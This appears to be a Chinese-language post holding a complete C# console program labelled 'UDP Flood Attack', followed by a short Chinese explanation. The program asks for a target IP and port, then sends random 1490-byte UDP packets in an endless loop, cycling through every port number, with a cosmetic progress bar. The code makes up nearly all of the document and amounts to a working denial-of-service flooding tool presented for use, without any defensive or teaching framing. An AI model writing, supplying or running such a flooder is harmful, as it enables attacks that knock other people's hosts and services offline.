UDP 包发#


using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class Program
{
    static void Main(string[] args)
    {
        Console.Clear();
        Console.WriteLine("UDP Flood Attack");

        Console.WriteLine();

        // 获取目标 IP 和端口
        Console.Write("IP Target : ");
        string ip = Console.ReadLine();
        Console.Write("Port      : ");
        int port = int.Parse(Console.ReadLine());

        // 准备 UDP 客户端
        UdpClient udpClient = new UdpClient();
        byte[] bytes = new byte[1490];
        new Random().NextBytes(bytes); // 生成随机字节数据

        // 模拟进度条
        Console.Clear();
        Console.WriteLine("Attack Starting");
        ShowProgressBar();

        // 开始发送 UDP 数据包
        int sent = 0;
        while (true)
        {
            try
            {
                udpClient.Send(bytes, bytes.Length, ip, port);
                sent++;
                Console.WriteLine($"Sent {sent} packets to {ip} through port: {port}");
                
                // 增加端口号
                port++;
                if (port > 65534)
                {
                    port = 1;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                break;
            }
        }
    }

    static void ShowProgressBar()
    {
        int[] delays = { 5, 5, 5, 5 };
        string[] progress = {
            "[                    ] 0% ",
            "[=====               ] 25%",
            "[==========          ] 50%",
            "[===============     ] 75%",
            "[====================] 100%"
        };

        for (int i = 0; i < progress.Length; i++)
        {
            Console.WriteLine(progress[i]);
            if (i < delays.Length)
            {
                Thread.Sleep(delays[i] * 1000); // 模拟延迟
            }
        }
    }
}

UDP 数据包发送：

使用 C# 的 UdpClient 类发送 UDP 数据包。 数据包内容为随机字节，通过 Random.NextBytes() 填充。 进度条显示： 模拟了攻击启动的加载进度，类似原始 Python 代码中的进度条。

端口递增逻辑：#

每次发送数据包后，端口号加 1。 超过 65534 时，重置为 1。
